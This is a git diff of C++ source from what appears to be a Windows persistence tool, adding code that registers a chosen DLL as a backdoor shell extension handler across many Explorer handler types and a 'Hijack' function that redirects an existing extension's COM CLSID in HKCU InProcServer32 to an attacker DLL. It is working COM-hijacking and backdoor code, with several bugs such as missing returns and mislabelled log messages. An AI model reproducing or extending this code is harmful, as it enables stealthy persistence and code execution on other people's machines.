@@ -1,22 +1,6 @@
 #include "reg.h"
 #include "logging.h"
 
-/*
-#define HKCU 0
-#define HKCR 1
-*/
-
-
-/*
-#define ICON_OVERLAY
-#define ICON_HANDLER
-#define DROP_HANDLER
-#define PROPERTY_SHEET_HANDLER
-#define THUMBNAIL_IMAGE_HANDLER
-#define INFOTIP_HANDLER
-#define METADATA_HANDLER
-#define COPY_HOOK_HANDLER
-*/
 
 #include <cwchar>
 
@@ -24,6 +8,148 @@
 #define MAX_VALUE_NAME 16383
 
 namespace reg {
+
+	// <chatGPT>
+	WCHAR* QueryFirstSubKey(HKEY hKey) {
+		WCHAR    achKey[MAX_KEY_LENGTH];
+		DWORD    cbName;
+		DWORD    cSubKeys = 0;
+		DWORD retCode;
+
+		WCHAR  achValue[MAX_VALUE_NAME];
+		DWORD cchValue = MAX_VALUE_NAME;
+
+		// Get the number of subkeys. 
+		retCode = RegQueryInfoKey(
+			hKey,
+			NULL,
+			NULL,
+			NULL,
+			&cSubKeys,
+			NULL,
+			NULL,
+			NULL,
+			NULL,
+			NULL,
+			NULL,
+			NULL);
+
+		if (cSubKeys) {
+			cbName = MAX_KEY_LENGTH;
+			retCode = RegEnumKeyExW(hKey, 0,
+				achKey,
+				&cbName,
+				NULL,
+				NULL,
+				NULL,
+				NULL);
+			if (retCode == ERROR_SUCCESS) {
+				HKEY hSubKey;
+				if (RegOpenKeyExW(hKey, achKey, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+					DWORD bufSize = MAX_PATH;
+					static WCHAR buffer[MAX_PATH] = TEXT("");
+
+					if (RegQueryValueExW(hSubKey, NULL, NULL, NULL, (LPBYTE)buffer, &bufSize) == ERROR_SUCCESS) {
+						RegCloseKey(hSubKey);
+						return buffer;
+					}
+
+					RegCloseKey(hSubKey);
+				}
+			}
+		}
+
+		return NULL;
+	}
+	WCHAR* QueryRegistryValue(HKEY hKey) {
+		DWORD bufSize = MAX_PATH;
+		static WCHAR buffer[MAX_PATH] = TEXT("");
+
+		if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &bufSize) == ERROR_SUCCESS) {
+			logging::log(LVL_INFO, L"Got the CLSID for Hijacking!");
+			return buffer;
+		}
+		else {
+			logging::log(LVL_FATAL, L"Error: Unable obtain CLSID for hijacking (perhaps extension isnt installed?) ");
+		}
+	}
+	// </chatGPT>
+
+
+	std::wstring ResolveProgId(CONST WCHAR* ext) {
+
+		HKEY  hkResult = NULL;
+		std::wstring logstr;
+		LSTATUS stat = NULL;
+		WCHAR* buf1;
+		BYTE* buf2;
+		HANDLE hHeap = NULL;
+
+		hHeap = GetProcessHeap();
+
+
+		buf1 = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_VALUE_NAME + 2);
+		buf2 = (BYTE*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_VALUE_NAME + 2);
+
+
+		DWORD sz1 = MAX_VALUE_NAME;
+		DWORD sz2 = MAX_VALUE_NAME;
+
+		logstr = L"Resolving ProgID for " + std::wstring(ext);
+		logging::log(LVL_INFO, logstr.c_str());
+
+		stat = RegOpenKeyExW(HKEY_CLASSES_ROOT, ext, NULL, KEY_QUERY_VALUE, &hkResult);
+		if (stat == ERROR_SUCCESS) {
+
+			stat = RegEnumValueW(hkResult, NULL, buf1, &sz1, NULL, NULL, buf2, &sz2);
+			if (stat == ERROR_SUCCESS) {
+
+				logstr = L"Successfully Resolved ProgId for the Extension (" + std::wstring((WCHAR*)buf2) + L")";
+				logging::log(LVL_INFO, logstr.c_str());
+				std::wstring ret = (WCHAR*)buf2;
+
+				HeapFree(hHeap, NULL, buf1);
+				HeapFree(hHeap, NULL, buf2);
+
+				return ret;
+
+			}
+			else {
+
+				HeapFree(hHeap, NULL, buf1);
+				HeapFree(hHeap, NULL, buf2);
+				logging::log(LVL_FATAL, L"Unable to Resolve ProgId for the Extension");
+
+			}
+
+		}
+		else {
+
+			HeapFree(hHeap, NULL, buf1);
+			HeapFree(hHeap, NULL, buf2);
+			logging::log(LVL_FATAL, L"Error Opening Key");
+
+		}
+
+	}
+
+	std::wstring CreateSubKey(WCHAR* ext, const WCHAR* subKey) {
+
+		std::wstring progId;
+		if (ext) {
+
+			progId = ResolveProgId(ext);
+
+		}
+		else {
+
+			progId = L"*";
+
+		}
+		progId.append(subKey);
+		return progId;
+
+	}
 
 	HKEY AddKey(HKEY hKey, CONST WCHAR* subkey) {
 
@@ -65,7 +191,7 @@ namespace reg {
 
 
 	}
-	
+
 	LSTATUS AddDefaultValue(HKEY hkResult, GUID guid) {
 
 		HRESULT hResult;
@@ -77,52 +203,27 @@ namespace reg {
 
 	}
 
-	std::wstring ResolveProgId(CONST WCHAR* ext) {
-
-		HKEY  hkResult = NULL;
-		std::wstring logstr;
-		LSTATUS stat = NULL;
-
-		WCHAR buf1[MAX_VALUE_NAME];
-		BYTE buf2[MAX_VALUE_NAME];
-
-		DWORD sz1 = MAX_VALUE_NAME;
-		DWORD sz2 = MAX_VALUE_NAME;
-
-		logstr = L"Resolving ProgID for " + std::wstring(ext);
-		logging::log(LVL_INFO, logstr.c_str());
-
-		stat = RegOpenKeyExW(HKEY_CLASSES_ROOT, ext, NULL, KEY_QUERY_VALUE, &hkResult);
-		if (stat == ERROR_SUCCESS) {
-
-			stat = RegEnumValueW(hkResult, NULL, buf1, &sz1, NULL, NULL, buf2, &sz2);
-			if (stat == ERROR_SUCCESS) {
-
-				logstr = L"Successfully Resolved ProgId for the Extension (" + std::wstring((WCHAR*)buf2) + L")";
-				logging::log(LVL_INFO, logstr.c_str());
-				return std::wstring((WCHAR*)buf2);
-
-			}
-			else {
-
-				logging::log(LVL_FATAL, L"Unable to Resolve ProgId for the Extension");
-
-			}
-
-		}
-		else {
-
-			logging::log(LVL_FATAL, L"Error Opening Key");
-
-		}
-
-	}
-
 	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath) {
 
 		LSTATUS status = NULL;
 		HKEY hkResult = NULL;
-		HKEY hKey = (Type) ? HKEY_CLASSES_ROOT : HKEY_CURRENT_USER;
+		HKEY hKey = NULL;
+
+		switch (Type) {
+
+		case HKCU:
+			hKey = HKEY_CURRENT_USER;
+			break;
+		case HKCR:
+			hKey = HKEY_CLASSES_ROOT;
+			break;
+		case HKLM:
+			hKey = HKEY_LOCAL_MACHINE;
+			break;
+
+		}
+
+
 		GUID objGuid = { NULL };
 		HRESULT hResult = NULL;
 		OLECHAR* guidString;
@@ -217,7 +318,6 @@ namespace reg {
 			hkResult = AddKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\BackdoorOverlay\\");
 			if (hkResult) {
 
-
 				status = AddDefaultValue(hkResult, Guid);
 				if (status == ERROR_SUCCESS) {
 
@@ -243,319 +343,317 @@ namespace reg {
 				}
 				break;
 		case ICON_HANDLER:
-			if (ext) {
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\IconHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
+			progId = CreateSubKey(ext, L"\\shellex\\IconHandler");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
 
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
 
-						logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Handler");
-
-					}
+					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Handler");
 					break;
 				}
-				break;
+				else {
 
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Handler");
+
+				}
+				break;
 			}
 			else {
-
-				logging::log(LVL_FATAL, L"Error Extension Needed for Technique");
-
+				logging::log(LVL_FATAL, L"Unable to Create Subkey");
 			}
-			break;
 
 		case DROP_HANDLER:
-			if (ext) {
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\DropHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
+			progId = CreateSubKey(ext, L"\\shellex\\DropHandler");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
 
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
 
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");
-
-					}
+					logging::log(LVL_INFO, L"Successfully Created Backdoor DROP Handler");
 					break;
 				}
-				break;
+				else {
 
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor DROP Handler");
+
+				}
+				break;
 			}
 			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For Drop Handler, Using Wildcard (*) Drop Handler");
-				progId = std::wstring(L"*\\shellex\\DropHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");
-
-					}
-					break;
-				}
-				break;
+				logging::log(LVL_FATAL, L"Unable to Create Subkey");
 			}
-			break;
 
 		case PROPERTY_SHEET_HANDLER:
 
-			if (ext) {
+			progId = CreateSubKey(ext, L"\\shellex\\PropertySheetHandlers\\BackdoorHandler");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\PropertySheetHandlers\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
 
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");
-
-					}
+					logging::log(LVL_INFO, L"Successfully Created Backdoor DROP Handler");
 					break;
+				}
+				else {
+
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor DROP Handler");
+
 				}
 				break;
-
 			}
 			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For PropertyHandler, Using Wildcard (*) PropertyHandler");
-				progId = std::wstring(L"*\\shellex\\PropertySheetHandlers\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");
-
-					}
-					break;
-				}
-
+				logging::log(LVL_FATAL, L"Unable to Create Subkey");
 			}
-			break;
 
 		case THUMBNAIL_IMAGE_HANDLER:
-			if (ext) {
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
+			progId = CreateSubKey(ext, L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
 
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
 
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");
-
-					}
+					logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
 					break;
 				}
-				break;
+				else {
 
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");
+
+				}
+				break;
 			}
 			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For Thumbnail Image Handler, Using Wildcard (*)");
-				progId = std::wstring(L"*\\shellex\\E357FCCD-A995-4576-B01F-234630154E96}\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");
-
-					}
-					break;
-				}
-				break;
+				logging::log(LVL_FATAL, L"Unable to Create Subkey");
 			}
 
 		case INFOTIP_HANDLER:
-			if (ext) {
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\{00021500-0000-0000-C000-000000000046}");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
+			progId = CreateSubKey(ext, L"\\shellex\\{00021500-0000-0000-C000-000000000046}");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
 
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
 
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Infotip Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Infotip Handler");
-
-					}
+					logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
 					break;
 				}
-				break;
+				else {
 
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");
+
+				}
 			}
 			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For Infotip Handler, Using Wildcard (*)");
-				progId = std::wstring(L"*\\shellex\\{00021500-0000-0000-C000-000000000046}\\");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Infotip Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Infotip Handler");
-
-					}
-					break;
-				}
-				break;
+				logging::log(LVL_FATAL, L"Unable to Create Subkey");
 			}
-			break;
 		case COPY_HOOK_HANDLER:
 
-				progId = (L"Directory\\shellex\\CopyHookHandlers\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
+			progId = (L"Directory\\shellex\\CopyHookHandlers\\BackdoorHandler");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
 
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
 
-						logging::log(LVL_INFO, L"Successfully Created Backdoor CopyHookHandlers");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor CopyHookHandlers");
-
-					}
+					logging::log(LVL_INFO, L"Successfully Created Backdoor CopyHookHandlers");
 					break;
 				}
-				break;
+				else {
 
-		case DATA_HANDLER:
-			if (ext) {
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor CopyHookHandlers");
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\DataHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");
-
-					}
-					break;
-				}
-				break;
-
-			}
-			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For Drop Handler, Using Wildcard (*) Drop Handler");
-				progId = std::wstring(L"*\\shellex\\DataHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");
-
-					}
-					break;
 				}
 				break;
 			}
 			break;
-			return (status == ERROR_SUCCESS) ? TRUE : FALSE;
+
+		case DATA_HANDLER:
+
+			progId = CreateSubKey(ext, L"\\shellex\\DataHandler");
+			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+			if (hkResult) {
+
+				status = AddDefaultValue(hkResult, Guid);
+				if (status == ERROR_SUCCESS) {
+
+					logging::log(LVL_INFO, L"Successfully Created Backdoor DATA Handler");
+					break;
+				}
+				else {
+
+					logging::log(LVL_FATAL, L"Unable to Set Backdoor DATA Handler");
+
+				}
+				break;
+			}
+			else {
+				logging::log(LVL_FATAL, L"Unable to Create Subkey");
+			}
 
 			}
 
 
 		}
 
-		
-	}
-
-	BOOL RemoveTechnique(BYTE type, WCHAR* ext)
-	{
-		return 0;
-	}
-	
-	BOOL RemoveTechnique(DWORD type, WCHAR* ext) {
-
 		return TRUE;
+
+	}
+
+	BOOL Hijack(BYTE Type, WCHAR* ext, std::wstring dllPath)
+	{
+
+		HKEY hKey = NULL;
+		HKEY phkResult;
+		LSTATUS status;
+		std::wstring subKey;
+		std::wstring progId;
+		WCHAR* clsid = NULL;
+		std::wstring clsidSubkey;
+		// step 1 set type 
+
+		switch (Type) {
+
+		case ICON_OVERLAY:
+
+			hKey = HKEY_LOCAL_MACHINE;
+			progId = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\";
+			break;
+
+		case ICON_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = CreateSubKey(ext, L"\\shellex\\IconHandler");
+			break;
+
+		case DROP_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = CreateSubKey(ext, L"\\shellex\\DropHandler");
+			break;
+
+		case PROPERTY_SHEET_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = CreateSubKey(ext, L"\\shellex\\PropertySheetHandlers");
+			break;
+
+		case THUMBNAIL_IMAGE_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = CreateSubKey(ext, L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\");
+			break;
+
+		case INFOTIP_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = CreateSubKey(ext, L"\\shellex\\{00021500-0000-0000-C000-000000000046}");
+			break;
+
+		case COPY_HOOK_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = L"Directory\\shellex\\CopyHookHandlers";
+			break;
+
+		case DATA_HANDLER:
+
+			hKey = HKEY_CLASSES_ROOT;
+			progId = CreateSubKey(ext, L"\\shellex\\DataHandler");
+			break;
+
+		}
+
+		// step 2 read possible shell extension
+
+		switch (Type) {
+
+		case ICON_OVERLAY:
+		case PROPERTY_SHEET_HANDLER:
+		case COPY_HOOK_HANDLER:
+			// enum subkeys
+
+			// identify extension CLSID
+			status = RegOpenKeyW(hKey, progId.c_str(), &phkResult);
+			if (status == ERROR_SUCCESS) {
+				clsid = QueryFirstSubKey(phkResult);
+				break;
+			}
+			else {
+
+				logging::log(LVL_FATAL, L"Unable to Open Subkey For Hijacking");
+
+			}
+
+
+		case ICON_HANDLER:
+		case DROP_HANDLER:
+		case THUMBNAIL_IMAGE_HANDLER:
+		case INFOTIP_HANDLER:
+		case DATA_HANDLER:
+
+			status = RegOpenKeyW(hKey, progId.c_str(), &phkResult);
+			if (status == ERROR_SUCCESS) {
+				clsid = QueryRegistryValue(phkResult);
+				break;
+			}
+			else {
+
+				logging::log(LVL_FATAL, L"Unable to Open Subkey For Hijacking");
+
+			}
+
+			break;
+
+		}
+
+		// step 3 write backdoor object
+
+		clsidSubkey = L"Software\\Classes\\CLSID\\" + std::wstring(clsid) + L"\\InProcServer32";
+		std::wstring loggingMsg = L"Creating Subkey HKCU\\" + clsidSubkey;
+		logging::log(LVL_INFO, loggingMsg.c_str());
+		phkResult = AddKey(HKEY_CURRENT_USER, clsidSubkey.c_str());
+		if (phkResult) {
+			status = RegSetValueExW(phkResult, NULL, NULL, REG_SZ, (const BYTE*)dllPath.c_str(), (DWORD)dllPath.size() * 2);
+			if (status == ERROR_SUCCESS) {
+
+				const WCHAR* ThreadingModel = L"Apartment";
+
+				status = RegSetValueExW(phkResult, L"ThreadingModel", NULL, REG_SZ, (const BYTE*)ThreadingModel, sizeof(ThreadingModel) * 2 + 2);
+
+				if (status == ERROR_SUCCESS) {
+
+					logging::log(LVL_INFO, L"Successfully Created COM Hijack");
+					return TRUE;
+
+				}
+				else {
+
+					// error adding reg value (ThreadingModel)
+					logging::log(LVL_FATAL, L"Unable to Register Values (ThreadingModel)");
+
+				}
+
+
+			}
+			else {
+
+				logging::log(LVL_FATAL, L"Unable create COM Hijack");
+
+			}
+
+			return 0;
+		}
+
+
 
 	}
 }
